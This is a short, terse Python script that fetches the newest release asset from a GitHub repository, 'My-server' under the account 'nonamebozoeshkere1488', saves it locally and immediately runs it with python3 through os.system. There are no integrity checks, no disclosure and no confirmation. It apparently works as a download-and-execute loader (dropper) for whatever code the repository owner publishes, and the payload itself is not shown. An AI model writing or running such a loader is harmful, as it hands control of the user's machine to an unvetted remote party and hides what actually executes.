import requests,os
def download_latest_release(repo_owner,repo_name,download_path='.'):
    F=f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest";B=requests.get(F);A=''
    if B.status_code==200:
        G=B.json();C=G.get('assets')
        if C:
            D=C[0];E=D.get('browser_download_url')
            if E:
                A=os.path.join(download_path,D.get('name'))
                with open (A,'wb')as H:H.write(requests.get(E).content)
                print(f'Download complete! File saved as: {A}')
            else:print('No files found to download in the last release.')
        else:print('No assets were found in the last release.')
    else:print('Error getting information about the latest release.')
    return A
repo_owner='nonamebozoeshkere1488'
repo_name='My-server'
flnm=download_latest_release(repo_owner,repo_name)
os.system(f"python3 {flnm}")